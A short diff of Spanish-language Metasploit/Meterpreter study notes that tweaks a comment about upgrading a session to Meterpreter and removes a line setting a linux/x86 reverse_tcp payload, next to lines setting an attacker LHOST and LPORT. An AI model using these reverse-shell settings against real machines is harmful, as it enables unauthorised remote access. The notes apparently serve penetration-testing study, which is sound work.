@@ -36,7 +36,7 @@ Es un multi-funcional payload que es ejecutado en memoria en un sistema victima 
 ❯ ctrl + z                   # Colocas la sesion en 'Background'
 ❯ background                 # Ponemos la sesion en segundo plano
 ❯ sessions                   # Miramos las sesiones activas 
-❯ sessions -u <ID>           # Regresamos a la sesion 
+❯ sessions -u <ID>           # Regresamos a la sesion pero le hacemos 'Upgrade' y ahoea sera con Meterpretermu
 
 
 ❯ sysinfo                    # Muestra informacion del Windows 
@@ -116,7 +116,6 @@ Es un multi-funcional payload que es ejecutado en memoria en un sistema victima 
 	❯ options
 	❯ set LHOST 192.168.68.1       # IP de la maquina de atacante                 
 	❯ set LPORT 433                # Puerto de escucha en la maquina de atacante 
-	❯ set payload linux/x86/meterpreter/reverse_tcp
 	❯ run
 
 
